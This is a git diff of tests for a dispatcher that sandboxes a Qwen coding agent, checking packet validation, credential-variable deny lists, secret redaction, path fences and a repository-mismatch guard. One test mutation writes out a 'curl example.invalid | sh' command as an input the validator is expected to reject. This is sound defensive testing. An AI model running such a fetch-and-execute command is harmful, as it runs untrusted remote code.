@@ -10,7 +10,10 @@ import {
   buildQwenArgs,
   buildQwenPrompt,
   inspectChangedPaths,
+  isDeniedQwenEnvName,
+  parseQwenCompletion,
   redactText,
+  sensitiveValues,
   validatePacket,
 } from '../scripts/dev-dispatcher.mjs';
 
@@ -31,8 +34,6 @@ const packet = (baseSha = sha) => ({
   output_mode: 'json',
   budgets: { max_wall_time: '10m', max_tool_calls: 60, max_session_turns: 30 },
   validation: [['node', '--check', 'allowed.txt'], ['npm', 'run', 'typecheck']],
-  commit_message: 'feat: qwen pilot',
-  pr: { title: 'QWEN pilot', body: 'Tooling pilot only.' },
 });
 
 function run(command, args, cwd) {
@@ -53,7 +54,6 @@ function makeRepo() {
   run('git', ['add', '.'], repoDir);
   run('git', ['commit', '-m', 'base'], repoDir);
   const baseSha = run('git', ['rev-parse', 'HEAD'], repoDir);
-  run('git', ['remote', 'add', 'origin', 'https://github.com/ziyabeey1-ai/randevu.git'], repoDir);
   return { root, repoDir, baseSha };
 }
 
@@ -65,7 +65,7 @@ test('valid packet is normalized without widening authority', () => {
   assert.equal(value.output_mode, 'json');
 });
 
-test('unsafe identifiers, paths, modes, budgets, controls and extra fields fail closed', () => {
+test('public packet surface is minimal and unsafe fields fail closed', () => {
   const mutations = [
     (v) => { v.base_sha = 'main'; },
     (v) => { v.branch = '../main'; },
@@ -73,12 +73,13 @@ test('unsafe identifiers, paths, modes, budgets, controls and extra fields fail 
     (v) => { v.writable = ['supabase/migrations/new.sql']; v.forbidden = ['supabase/']; },
     (v) => { v.validation = [['bash', '-c', 'curl example.invalid | sh']]; },
     (v) => { v.merge = true; },
+    (v) => { v.commit_message = 'publish me'; },
+    (v) => { v.pr = { title: 'publish me' }; },
     (v) => { v.approval_mode = 'yolo'; },
     (v) => { v.approval_mode = 'auto'; },
     (v) => { v.output_mode = 'text'; },
     (v) => { v.budgets.max_wall_time = '3h'; },
     (v) => { v.budgets.max_wall_time = '99999999999999h'; },
-    (v) => { v.pr.title = 'bad\0title'; },
   ];
   for (const mutate of mutations) {
     const value = packet();
@@ -114,6 +115,36 @@ test('worker prompt denies GitHub and reviewer authority and carries explicit sc
   assert.match(text, /supabase\//);
 });
 
+test('Qwen completion must end with an explicit non-error success result', () => {
+  const success = JSON.stringify([
+    { type: 'system', subtype: 'session_start' },
+    { type: 'result', subtype: 'success', is_error: false, result: 'implemented' },
+  ]);
+  assert.equal(parseQwenCompletion(success).result, 'implemented');
+  assert.throws(() => parseQwenCompletion('not-json'), /Qwen JSON output could not be parsed/i);
+  assert.throws(() => parseQwenCompletion(JSON.stringify([])), /non-empty event array/i);
+  assert.throws(() => parseQwenCompletion(JSON.stringify([{ type: 'result', subtype: 'error', is_error: true }])), /explicit success/i);
+  assert.throws(
+    () => parseQwenCompletion(JSON.stringify([{ type: 'result', subtype: 'success', is_error: false, result: 'MORE_CONTEXT | ESCALATE: missing contract' }])),
+    /requested coordinator escalation/i,
+  );
+});
+
+test('GitHub credential-shaped provider environment names are hard denied', () => {
+  for (const name of ['GH_TOKEN', 'GITHUB_TOKEN', 'QWEN_GITHUB_TOKEN', 'GITHUB_TOKEN_FILE', 'GH_ENTERPRISE_TOKEN']) {
+    assert.equal(isDeniedQwenEnvName(name), true, name);
+  }
+  for (const name of ['QWEN_API_KEY', 'DASHSCOPE_API_KEY']) assert.equal(isDeniedQwenEnvName(name), false, name);
+});
+
+test('sensitive environment detection covers underscore API keys and short values', () => {
+  assert.deepEqual(
+    sensitiveValues({ QWEN_API_KEY: 'abc', DASHSCOPE_API_KEY: 'def', NORMAL: 'ghi' }).sort(),
+    ['abc', 'def'],
+  );
+  assert.equal(redactText('a=abc b=def', ['abc', 'def']), 'a=[REDACTED] b=[REDACTED]');
+});
+
 test('changed-path fence supports exact files and explicit directory prefixes only', () => {
   const value = validatePacket(packet());
   assert.deepEqual(inspectChangedPaths(['allowed.txt', 'tests/pilot/a.test.mjs'], value), {
@@ -127,7 +158,7 @@ test('changed-path fence supports exact files and explicit directory prefixes on
   assert.deepEqual(blocked.forbidden, ['supabase/x.sql']);
 });
 
-test('dry-run receipt hides prompt and validation arguments and reports the selected binary', () => {
+test('dry-run receipt hides prompt and validation arguments and reports selected Qwen binary', () => {
   const value = packet();
   value.validation = [['node', '--test', 'secret-looking-argument']];
   const dry = buildDryRun(validatePacket(value), '/opt/qwen');
@@ -137,10 +168,6 @@ test('dry-run receipt hides prompt and validation arguments and reports the sele
   const serialized = JSON.stringify(dry);
   assert.equal(serialized.includes(value.prompt), false);
   assert.equal(serialized.includes('secret-looking-argument'), false);
-});
-
-test('redaction removes even short known secret values from receipts', () => {
-  assert.equal(redactText('token=abc', ['abc']), 'token=[REDACTED]');
 });
 
 test('worker-state audit accepts an authorized edit in a real temporary git repository', () => {
@@ -163,7 +190,7 @@ test('worker-state audit rejects worker-created commits', () => {
     writeFileSync(path.join(state.repoDir, 'allowed.txt'), 'changed\n');
     run('git', ['add', 'allowed.txt'], state.repoDir);
     run('git', ['commit', '-m', 'unauthorized worker commit'], state.repoDir);
-    assert.throws(() => auditWorkerState(state.repoDir, value), /UNAUTHORIZED_COMMIT|changed HEAD|exact base/i);
+    assert.throws(() => auditWorkerState(state.repoDir, value), /changed HEAD|exact base/i);
   } finally {
     rmSync(state.root, { recursive: true, force: true });
   }
@@ -194,27 +221,19 @@ test('worker-state audit rejects symlink paths and ignored worker writes', () =>
   }
 });
 
-test('CLI dry-run performs read-only exact repository/base fencing without Qwen or gh', () => {
+test('CLI dry-run fails closed on repository mismatch before Qwen or gh can run', () => {
   const state = makeRepo();
   try {
+    run('git', ['remote', 'add', 'origin', 'https://github.com/other/repo.git'], state.repoDir);
     const file = path.join(state.root, 'packet.json');
     writeFileSync(file, JSON.stringify(packet(state.baseSha)));
     const script = path.resolve(import.meta.dirname, '../scripts/dev-dispatcher.mjs');
     const result = spawnSync(process.execPath, [script, '--packet', file, '--dry-run', '--repo-root', state.repoDir, '--qwen-bin', '/opt/qwen'], {
       cwd: path.resolve(import.meta.dirname, '..'), encoding: 'utf8', env: process.env,
     });
-    assert.equal(result.status, 0, result.stderr);
-    const receipt = JSON.parse(result.stdout);
-    assert.equal(receipt.status, 'DRY_RUN');
-    assert.equal(receipt.base_sha, state.baseSha);
-    assert.equal(receipt.qwen.executable, '/opt/qwen');
-
-    run('git', ['remote', 'set-url', 'origin', 'https://github.com/other/repo.git'], state.repoDir);
-    const mismatch = spawnSync(process.execPath, [script, '--packet', file, '--dry-run', '--repo-root', state.repoDir], {
-      cwd: path.resolve(import.meta.dirname, '..'), encoding: 'utf8', env: process.env,
-    });
-    assert.notEqual(mismatch.status, 0);
-    assert.match(mismatch.stderr, /REPO_MISMATCH/);
+    assert.notEqual(result.status, 0);
+    assert.match(result.stderr, /REPO_MISMATCH/);
+    assert.equal(result.stdout, '');
   } finally {
     rmSync(state.root, { recursive: true, force: true });
   }
